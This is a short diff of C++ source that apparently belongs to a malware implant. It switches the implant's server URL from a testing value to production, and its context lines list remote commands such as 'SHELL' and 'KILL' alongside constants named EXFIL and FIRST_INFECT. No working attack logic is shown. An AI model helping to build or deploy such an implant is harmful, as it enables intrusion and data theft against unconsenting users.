@@ -9,6 +9,7 @@
 #include <chrono>
 #include <thread>
 #include <curl/curl.h>
+#include <algorithm>
 #include <sys/types.h>
 #include <unistd.h>
 #include <signal.h>
@@ -19,7 +20,7 @@
 //Consts
 
 static const std::vector<std::string> POLO_CMDS = {"KILL", "SHELL", "UPDATE"};
-static const std::string URL = TESTING; 
+static const std::string URL = PROD; 
 static const std::string EXFIL = "aGF0c3UK";
 static const std::string INSTR = "R1JOQ2hlZXRhaAo";
 static const std::string FIRST_INFECT = "ZGlyawo"; 
